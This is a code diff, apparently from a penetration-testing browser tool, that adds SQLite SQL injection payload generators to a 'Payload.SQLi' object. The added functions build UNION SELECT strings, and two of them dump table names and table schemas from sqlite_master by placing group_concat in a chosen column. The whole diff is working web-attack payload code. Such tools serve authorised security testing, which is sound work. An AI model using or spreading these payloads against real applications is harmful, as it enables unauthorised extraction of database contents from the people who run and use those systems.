@@ -123,6 +123,47 @@ window.Payload.SQLi = {
     errorBased: ({ columns, position }) => {
       return 'cast(version() as int)'
     }
+  },
+  SQLite: {
+    unionSelect: ({ columns, position }) => {
+      columns = parseInt(columns)
+      if (isNaN(columns) === true) {
+        return ''
+      }
+
+      return 'union select ' +
+        Array.from(Array(columns + 1).keys()).slice(1).join(',')
+    },
+
+    dumpTables: ({ columns, position }) => {
+      columns = parseInt(columns)
+      position = parseInt(position)
+      if (isNaN(columns) === true || isNaN(position) === true ||
+          position > columns) {
+        return ''
+      }
+
+      const fields = Array.from(Array(columns + 1).keys()).slice(1)
+      fields[position - 1] = 'group_concat(name)'
+
+      return 'union select ' + fields.join(',') +
+      " from sqlite_master WHERE type='table'"
+    },
+
+    dumpColumns: ({ columns, position }) => {
+      columns = parseInt(columns)
+      position = parseInt(position)
+      if (isNaN(columns) === true || isNaN(position) === true ||
+          position > columns) {
+        return ''
+      }
+
+      const fields = Array.from(Array(columns + 1).keys()).slice(1)
+      fields[position - 1] = 'group_concat(sql)'
+
+      return 'union select ' + fields.join(',') +
+        " from sqlite_master WHERE type='table'"
+    }
   }
 }
 
